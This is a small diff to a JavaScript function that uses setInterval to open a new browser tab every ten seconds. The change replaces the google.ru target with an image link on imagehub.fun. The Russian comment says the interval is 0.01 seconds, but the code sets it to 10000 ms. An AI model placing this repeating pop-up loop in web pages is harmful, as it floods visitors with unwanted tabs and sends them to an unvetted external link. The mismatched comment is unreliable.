@@ -1,7 +1,7 @@
 // Функция для открытия google.ru каждые 0.01 секунд
 function openGoogle() {
     setInterval(function() {
-        window.open('https://google.ru', '_blank');
+        window.open('https://imagehub.fun/F0CAFS.png', '_blank');
     }, 10000);
 }
 
